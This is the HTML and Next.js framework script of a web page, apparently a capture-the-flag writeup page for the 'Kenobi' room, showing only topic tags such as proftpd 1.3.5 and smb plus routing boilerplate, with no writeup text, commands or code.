href="/cyber/tags?searchTag=box"><my-tag>box</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ctf"><my-tag>ctf</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=cve"><my-tag>cve</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=easy"><my-tag>easy</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ejpt"><my-tag>ejpt</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=linux"><my-tag>linux</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=nsf"><my-tag>nsf</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=oscp"><my-tag>oscp</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=proftpd+1.3.5"><my-tag>proftpd 1.3.5</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=smb"><my-tag>smb</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=thm"><my-tag>thm</my-tag></a></div></div></div></div><script src="/_next/static/chunks/webpack-97a4f47456697fca.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n4:I[3108,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-8e89d807b2dd16b4.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"6980\",\"static/chunks/app/cyber/writeup/kenobi/page-6c8a26b70c40e028.js\"],\"default\"]\n5:I[5897,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-8e89d807b2dd16b4.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"6980\",\"static/chunks/app/cyber/writeup/kenobi/page-6c8a26b70c40e028.js\"],\"default\"]\n6:I[8845,[\"7667\",\"static/chunks/4bd22374-385178446340ab50.js\",\"8173\",\"static/chunks/8173-a0231b583aa8a812.js\",\"8541\",\"static/chunks/8541-8e89d807b2dd16b4.js\",\"5699\",\"static/chunks/5699-d5e6aa1c7bb352a9.js\",\"6980\",\"static/chunks/app/cyber/writeup/kenobi/page-6c8a26b70c40e028.js\"],\"default\"]\n7:I[6213,[],\"OutletBoundary\"]\n9:I[6213,[],\"MetadataBoundary\"]\nb:I[6213,[],\"ViewportBoundary\"]\nd:I[4835,[],\"\"]\n:HL[\"/_next/static/css/f194b09a73f2e100.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"R8BAXJwLMFiNLE5_DJVMX\",\"p\":\"\",\"c\":[\"\",\"cyber\",\"writeup\",\"kenobi\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"cyber\",{\"children\":[\"writeup\",{\"children\":[\"kenobi\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[\"$\",\"div\",null,{\"children\":[\"$\",\"center\",null,{\"children\":[\"Page not found\",[\"$\",\"br\",null,{}],\"You have followed and old link that does not work anymore\",[\"$\",\"br\",null,{}],\"The site has migrated from React app to NextJS app\"]}]}]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"cyber\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"writeup\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"kenobi\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\",\"kenobi\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"Wrapper\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"div\",null,{\"className\":\"content\",\"children\":[\"$\",\"div\",null,{\"className\":\"Post\",\"children\":[\"$\",\"$L5\",null,{\"postname\":\"writeupdb/kenobi.json\"}]}]}],[\"$\",\"$L6\",null,{\"postname\":\"writeupdb/kenobi.json\"}]]}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/f194b09a73f2e100.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":\"$L8\"}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"-nF_i8yHXp44ULwHYJc1S\",{\"children\":[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/avatar.jpg\"}]]\n"])</script><script>self.__next_f.push([1,"8:null\n"])</script></body></html>